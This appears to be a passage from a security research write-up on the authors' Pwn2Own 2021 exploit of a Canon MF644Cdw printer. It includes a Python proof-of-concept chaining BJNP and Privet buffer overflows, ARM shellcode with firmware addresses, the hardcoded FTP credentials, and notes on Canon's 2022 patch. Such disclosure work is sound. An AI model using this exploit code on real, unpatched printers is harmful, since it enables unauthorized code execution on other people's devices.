+<p>Quick recap of the exploitation strategy:</p>
+<ul>
+<li>Start a BJNP session and store our exploit in the session data,</li>
+<li>Exploit the buffer overflow to jump in the session buffer,</li>
+<li>Close the BJNP session to remove our exploit from memory once it ran.</li>
+</ul>
+<p>To demonstrate this, we can jump to the function which disables the energy save mode on the printer (and wakes the screen up, which is useful to check if it actually worked). In our firmware, it is located at <code>0x413054D8</code>, and we simply need to set the <code>r0</code> register to <code>0</code> before calling it:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x54D8</span>
+<span class="nf">movt</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x4130</span>
+<span class="nf">blx</span> <span class="no">r12</span>
+</code></pre></div>
+
+
+<p>To avoid the printer rebooting, we can also fix the <code>r0</code> and <code>lr</code> registers to
+restore the original flow:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">mov</span> <span class="no">r1</span><span class="p">,</span> <span class="c1">#0xEBA0</span>
+<span class="nf">movt</span> <span class="no">r1</span><span class="p">,</span> <span class="c1">#0x40DE</span>
+<span class="nf">mov</span> <span class="no">lr</span><span class="p">,</span> <span class="no">r1</span>
+<span class="nf">bx</span> <span class="no">lr</span>
+</code></pre></div>
+
+
+<p>Putting it all together, here is an exploit which does just that:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">http.client</span>
+
+<span class="k">def</span> <span class="nf">store_payload</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x180</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">(</span>
+        <span class="s2">&quot;Payload too long: </span><span class="si">{}</span><span class="s2"> is greater than </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mh">0x180</span><span class="p">)</span>
+    <span class="p">)</span>
+
+    <span class="n">pkt</span> <span class="o">=</span> <span class="n">BJNPPkt</span><span class="p">(</span>
+        <span class="n">cmd</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span>
+        <span class="n">seq_no</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">sess_id</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">body</span><span class="o">=</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x180</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))),</span>
+    <span class="p">)</span>
+    <span class="n">pkt</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">))</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">BJNPPkt</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">))</span>
+    <span class="n">res</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
+
+    <span class="c1"># The printer should return a valid session ID</span>
+    <span class="k">assert</span> <span class="n">res</span><span class="o">.</span><span class="n">sess_id</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Failed to create session&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">cleanup_payload</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
+    <span class="n">pkt</span> <span class="o">=</span> <span class="n">BJNPPkt</span><span class="p">(</span>
+        <span class="n">cmd</span><span class="o">=</span><span class="mh">0x211</span><span class="p">,</span>
+        <span class="n">seq_no</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">sess_id</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">pkt</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">))</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">BJNPPkt</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">))</span>
+    <span class="n">res</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;192.168.1.100&quot;</span><span class="p">,</span> <span class="mi">8610</span><span class="p">))</span>
+
+<span class="n">bjnp_payloads</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&quot;4FF0000045F2D84C44F2301CE0474FF000004EF6A031C4F2DE018E467047&quot;</span><span class="p">)</span>
+<span class="n">store_payload</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">bjnp_payload</span><span class="p">)</span>
+
+<span class="n">privet_payload</span> <span class="o">=</span> <span class="n">privet</span><span class="o">.</span><span class="n">PrivetPayload</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">=</span><span class="mh">0x46F2B2B9</span><span class="p">)</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;Content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;X-Privet-Token&quot;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">privet_payload</span><span class="p">)),</span>
+<span class="p">}</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s2">&quot;192.168.1.100&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/privet/register&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="n">cleanup_payload</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+
+<h1 id="payload">Payload</h1>
+<p>We can now build upon this PoC to create a meaningful payload. As we want to display a custom image on screen, we need to:</p>
+<ul>
+<li>Find a way of uploading the image data (as we're limited to <code>0x180</code> bytes in total in the BJNP session buffer),</li>
+<li>Make sure the screen is turned on (for example, by disabling the energy save mode as above),</li>
+<li>Call the display function with our image data to show it on screen.</li>
+</ul>
+<h2 id="displaying-an-image">Displaying an image</h2>
+<p>As the firmware contains a number of debug functions, we were able to understand the display mechanism rather quickly. There is  a function able to write an image into the frame buffer (located at <code>0x41305158</code> in our firmware) which takes two arguments: the address of an RGB image, and the address of a frame buffer structure which looks like below:</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="n">frame_buffer_struct</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">x</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">y</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">width</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">height</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+
+
+<p>The frame buffer can only be used to display <code>320x240</code> pixels at a time which isn't enough to cover the whole screen as it is 800x480 pixels. We push this structure on the stack with the following code:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="c1">#8</span>
+<span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#320</span>
+<span class="nf">strh</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#4]  ; width</span>
+<span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#240</span>
+<span class="nf">strh</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#6]  ; height</span>
+<span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">strh</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">]</span>      <span class="c1">; x</span>
+<span class="nf">strh</span> <span class="no">r0</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#2]  ; y</span>
+</code></pre></div>
+
+
+<p>Once this is done, assuming <code>r5</code> contains the address of our image buffer, we display it on screen with the following code:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">; Display frame buffer</span>
+<span class="nf">mov</span> <span class="no">r1</span><span class="p">,</span> <span class="no">r5</span>         <span class="c1">; Image buffer</span>
+<span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">sp</span>         <span class="c1">; Frame buffer struct</span>
+<span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x5158</span>
+<span class="nf">movt</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x4130</span>
+<span class="nf">blx</span> <span class="no">r12</span>
+</code></pre></div>
+
+
+<p>This leaves the question of the image buffer itself.</p>
+<h2 id="ftp">FTP</h2>
+<p>Though we thought of multiple options to upload the image, we ended up deciding to use a legitimate feature of the printer: it can serve as an FTP server, which is disabled by default. Thus, we need to:</p>
+<ul>
+<li>Enable the <code>ftpd</code> service,</li>
+<li>Upload our image from the client,</li>
+<li>Read the image in a buffer.</li>
+</ul>
+<p>In our firmware, the function to enable the <code>ftpd</code> service is located at <code>0x4185F664</code> and takes 4 arguments: the maximum number of simultaneous client, the timeout, the command port, and the data port. It can be enabled with the following payload:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#0x3       ; Max clients</span>
+<span class="nf">mov</span> <span class="no">r1</span><span class="p">,</span> <span class="c1">#0x0       ; Timeout</span>
+<span class="nf">mov</span> <span class="no">r2</span><span class="p">,</span> <span class="c1">#21        ; Command port</span>
+<span class="nf">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="c1">#20        ; Data port</span>
+<span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0xF664</span>
+<span class="nf">movt</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x4185</span>
+<span class="nf">blx</span> <span class="no">r12</span>
+</code></pre></div>
+
+
+<p>The <code>ftpd</code> service also has a feature to change directory. This doesn't really matter to us since the default directory is always <code>S:/</code>. We could however decide to change it to: either access data stored on other paths (e.g. the admin password) or to ensure our exploit works correctly even if the directory was somehow changed beforehand. To do so, we would need to call the function at <code>0x4185E2A4</code> with the <code>r0</code> register set to the address of the new path string.</p>
+<p>Once enabled, the FTP server requires credentials to connect. Fortunately for us, they are hardcoded in the firmware as <code>guest</code> / <code>welcome.</code>. We can upload our image (called <code>a</code> in this example) with the following code:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ftplib</span>
+
+<span class="k">with</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;192.168.1.100&quot;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">&quot;guest&quot;</span><span class="p">,</span> <span class="n">passwd</span><span class="o">=</span><span class="s2">&quot;welcome.&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">ftp</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;image.raw&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">ftp</span><span class="o">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s2">&quot;STOR a&quot;</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</code></pre></div>
+
+
+<h2 id="file-system">File system</h2>
+<p>We are simply left with reading the image from the filesystem. Thankfully, DRYOS has an abstraction layer to handle this, allowing us to only look for the equivalent of the usual <code>open</code>, <code>read</code>, and <code>close</code> functions. In our firmware, they are located respectively at <code>0x416917C8</code>, <code>0x41691A20</code>, and <code>0x41691878</code>. Assuming <code>r5</code> contains the address of our image path, we can open the file like so:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">mov</span> <span class="no">r2</span><span class="p">,</span> <span class="c1">#0x1C0</span>
+<span class="nf">mov</span> <span class="no">r1</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r5</span>         <span class="c1">; Image path</span>
+<span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x17C8</span>
+<span class="nf">movt</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x4169</span>
+<span class="nf">blx</span> <span class="no">r12</span>
+<span class="nf">mov</span> <span class="no">r5</span><span class="p">,</span> <span class="no">r0</span>         <span class="c1">; File handle</span>
+
+<span class="c1">; Exit if there was an error opening the file</span>
+<span class="nf">cmp</span> <span class="no">r5</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">ble</span> <span class="no">.end</span>
+</code></pre></div>
+
+
+<p>The image being too large to store on the stack, we could decide to dynamically allocate a buffer. However, the firmware contains debug images stored in writable memory, so we decided to overwrite one of them instead to simplify the exploit. We went with <code>0x436A3F64</code>, which originally contains a screenshot of a calculator.</p>
+<p>Here is the payload to read the content of the file into this buffer:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">; Get address of image buffer</span>
+<span class="nf">mov</span> <span class="no">r10</span><span class="p">,</span> <span class="c1">#0x3F64</span>
+<span class="nf">movt</span> <span class="no">r10</span><span class="p">,</span> <span class="c1">#0x436A</span>
+
+<span class="c1">; Compute image size</span>
+<span class="nf">mov</span> <span class="no">r2</span><span class="p">,</span> <span class="c1">#320       ; Width</span>
+<span class="nf">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="c1">#240       ; Height</span>
+<span class="nf">mov</span> <span class="no">r6</span><span class="p">,</span> <span class="c1">#3         ; Depth</span>
+<span class="nf">mul</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r2</span>
+<span class="nf">mul</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r6</span><span class="p">,</span> <span class="no">r3</span>
+
+<span class="c1">; Read content of file in buffer</span>
+<span class="nf">mov</span> <span class="no">r3</span><span class="p">,</span> <span class="c1">#0         ; Bytes read</span>
+<span class="nf">mov</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r6</span>         <span class="c1">; Bytes left to read</span>
+<span class="nl">.loop:</span>
+<span class="nf">mov</span> <span class="no">r2</span><span class="p">,</span> <span class="no">r4</span>         <span class="c1">; Number of bytes to read</span>
+<span class="nf">add</span> <span class="no">r1</span><span class="p">,</span> <span class="no">r10</span><span class="p">,</span> <span class="no">r3</span>    <span class="c1">; Buffer position</span>
+<span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r5</span>         <span class="c1">; File handle</span>
+<span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x1A20</span>
+<span class="nf">movt</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x4169</span>
+<span class="nf">blx</span> <span class="no">r12</span>
+<span class="nf">cmp</span> <span class="no">r0</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">ble</span> <span class="no">.end_read</span>      <span class="c1">; Exit in case of an error</span>
+<span class="nf">add</span> <span class="no">r3</span><span class="p">,</span> <span class="no">r3</span><span class="p">,</span> <span class="no">r0</span>
+<span class="nf">sub</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r4</span><span class="p">,</span> <span class="no">r0</span>
+<span class="nf">cmp</span> <span class="no">r4</span><span class="p">,</span> <span class="c1">#0</span>
+<span class="nf">bgt</span> <span class="no">.loop</span>
+</code></pre></div>
+
+
+<p>For completeness, here is how to close the file:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">mov</span> <span class="no">r0</span><span class="p">,</span> <span class="no">r5</span>
+<span class="nf">mov</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x1878</span>
+<span class="nf">movt</span> <span class="no">r12</span><span class="p">,</span> <span class="c1">#0x4169</span>
+<span class="nf">blx</span> <span class="no">r12</span>
+</code></pre></div>
+
+
+<h2 id="putting-everything-together">Putting everything together</h2>
+<p>In the end, our exploit is split into 3 parts:</p>
+<ol>
+<li>Execute a first payload to enable the <code>ftpd</code> service and change to the <code>S:/</code> directory,</li>
+<li>Upload our image using FTP,</li>
+<li>Exploit the vulnerability with another payload reading the image and displaying it on the screen.</li>
+</ol>
+<p>You can find the script handling all this in the <a href="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/exploit">exploit folder</a> and you can see the exploit in action <a href="https://youtu.be/rY4phaf7KEU?t=4242">here</a>.</p>
+<p><center>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/rY4phaf7KEU?start=4242" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</center></p>
+<p>It feels a bit... Anticlimactic? Where is the <a href="https://www.youtube.com/watch?v=5RS4myPuUn8">Doom port for DRYOS</a> when you need it...</p>
+<h1 id="patch">Patch</h1>
+<p>Canon published <a href="https://www.usa.canon.com/internet/portal/us/home/support/product-advisories/detail/canon-laser-printer-inkjet-printer-and-small-office-multifunctional-printer-measure-against-buffer-overflow/">an advisory</a> in March 2022 alongside a <a href="https://cweb.canon.jp/drv-upd/satera-mfp/mf644cdw-firm-win.html">firmware update</a>.</p>
+<p>A quick look at this new version shows that the <code>/privet</code> endpoint is no longer reachable: the function registering this path now logs a message before simply exiting, and the <code>/privet</code> string no longer appears in the binary. Despite this, it seems like the vulnerable code itself is still there - though it is now supposedly unreachable. Strings related to FTP have also been removed, hinting that Canon may have disabled this feature as well.</p>
+<p>As a side note, disabling this feature makes sense since Google Cloud Print was discontinued on December 31, 2020, and Canon <a href="https://www.usa.canon.com/internet/portal/us/home/support/product-advisories/detail/service%20notice%20google%20termination%20of%20support%20for%20google%20cloud%20print/!ut/p/z1/pVJNb-IwEP0r6YFTldqN88XeEqCCblMK5Su-IMdxgrWJHTmGaP_9GpYeEC3Vai1Z9oze6M17MwCDDcCCHHhJNJeCVCZOsb9NZuNwPBnAl-niZwyjUTx9R_4QwQEC6xMAfnEiCPBF_ZMzglGyWL0kaILg3D_X3wDg2_wrgAFuKM9BSnJEPbcIbYrywHY9r28Tj-R24IVB7riZGzjoiKZCN3oHUkqEFFvBuo5l20bJfE9124Pnn03yA2-l4szkWqYOnDJLSH18SinLilmaqZqLk1WWLKx23zRSaauQ6gNBK7nPrUZxoa-UXknBt418_s5KMytHJYOkNIYQvbO5KCTYnMiZasGGykoquyJGzEfAa1IyalKtXRe-69K8M33iSyY47wcw8of-uP8aw8nMuwKsYtcA-sMBcp6O3Z4Bt8WUlcz-blgkMhSarhUrmGLqYa9Meqd10_7owR400_h1vKV8oLLuwc9KdrLVYHOJBKlxPPjScbMM6wNnHVgKqWrTyfs_rtIYXjFMg0c4c9-mC8_xnGTh_yfD83fbv45BGtzPexB3AD-Cpl4u6xD9tnH61oyKRHuZV9bbYfxq41l0d_cHnjk3Dw!!/dz/d5/L2dBISEvZ0FBIS9nQSEh">announced</a> they no longer supported it as of January 1, 2021.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>In the end, we achieved a perfectly reliable exploit for our printer. It should be noted that our whole work was based on the European version of the printer, while the American version was used during the contest, so a bit of uncertainty still remained on the d-day. Fortunately, we had checked that the firmware of both versions matched beforehand.</p>
+<p>We also adapted the offsets in our exploit to handle versions <code>9.01</code>, <code>10.02</code>, and <code>10.03</code> (released during the competition) in case the organizers' printer was updated. To do so, we built a script to automatically find the required offsets in the firmware and update our exploit.</p>
+<p>All in all, we were able to remotely display an image of our choosing on the printer's LCD screen, which counted as a success and earned us 2 Master of Pwn points.</p>
+                </div><!-- /.entry-content -->
+        </article>
+</section>
+        </div><!--/span-->
+      </div><!--/row-->
+      <hr>
+
+      <footer style='background-color:#00000000'>
+        <center>
+          <address id="about">
+                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
+                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
+          </address><!-- /#about -->
+
+          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
+                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
+        </center>
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
+    <script src="../../../../../theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
